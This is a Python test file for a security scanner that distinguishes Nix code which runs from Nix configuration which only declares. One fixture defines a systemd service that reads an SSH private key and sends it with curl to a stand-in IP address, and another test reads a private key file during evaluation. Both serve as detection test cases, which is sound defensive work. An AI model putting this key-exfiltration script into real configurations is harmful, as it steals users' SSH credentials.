"""What a Nix file runs, as against what it declares (review 98, FP-15).

The declarations are the shapes 100 of 3,000 real Nix repositories were blocked for; the running
cases are the same reads inside shell that a service, an activation or a build executes.
"""

from __future__ import annotations

from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.analysis.nix.nix_code import NixCode
from cordon_scanner.foundation.config.settings import Config

DECLARATIONS = """{ config, pkgs, ... }:
{
  # The shapes that were blocked: package names, a key path as configuration, a host by address.
  home.packages = [ pkgs.libsecret pkgs.curl pkgs.awscli2 ];
  age.identityPaths = [ "${config.home.homeDirectory}/.ssh/id_ed25519" ];
  programs.ssh = {
    enable = true;
    controlPath = "~/.ssh/master-%r@%n:%p";
    extraConfig = ''
      Host router
        IdentityFile ~/.ssh/id_ed25519
        IdentityFile ~/.ssh/id_rsa
    '';
    matchBlocks.router = {
      hostname = "66.211.202.71";
      identityFile = [ "~/.ssh/id_ed25519" "~/.ssh/id_rsa" ];
    };
  };
}
"""

#: The same key read by a service that runs on the machine, and sent with curl.
RUNS = """{ pkgs, ... }:
{
  systemd.user.services.sync = {
    script = ''
      key=$(cat $HOME/.ssh/id_ed25519)
      ${pkgs.curl}/bin/curl -d "$key" http://203.0.113.9:8080/k
    '';
  };
}
"""


class NixKit:
    @staticmethod
    def rules(tmp_path: Path, text: str) -> set[str]:
        (tmp_path / "home.nix").write_text(text, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return {f.rule_id for f in result.findings}


class TestRunningSpans:
    def test_a_service_script_runs_and_ssh_config_text_does_not(self) -> None:
        spans = NixCode.running_spans(DECLARATIONS + RUNS.replace("{ pkgs, ... }:\n", ""))
        text = DECLARATIONS + RUNS.replace("{ pkgs, ... }:\n", "")
        curl = text.index("curl -d")
        identity = text.index("IdentityFile")
        assert any(a <= curl < b for a, b in spans)
        assert not any(a <= identity < b for a, b in spans)

    def test_escapes_do_not_end_an_indented_string(self) -> None:
        text = "x = ''\n  echo '''quoted''' ''${HOME}\n'';\n"
        [(start, end)] = NixCode.indented_strings(text)
        assert text[start:end].strip().endswith("''${HOME}")

    def test_impure_evaluation_runs(self) -> None:
        text = "k = builtins.readFile /home/u/.ssh/id_rsa;\n"
        assert NixCode.running_spans(text)


class TestANixConfiguration:
    def test_that_declares_keys_and_hosts_is_not_reported(self, tmp_path: Path) -> None:
        found = NixKit.rules(tmp_path, DECLARATIONS)
        assert not {r for r in found if r.startswith(("SUSPECT.EXFIL", "MALWARE.EXFIL"))}, found

    def test_whose_service_sends_a_key_still_is(self, tmp_path: Path) -> None:
        found = NixKit.rules(tmp_path, RUNS)
        assert {r for r in found if "EXFIL" in r}, found
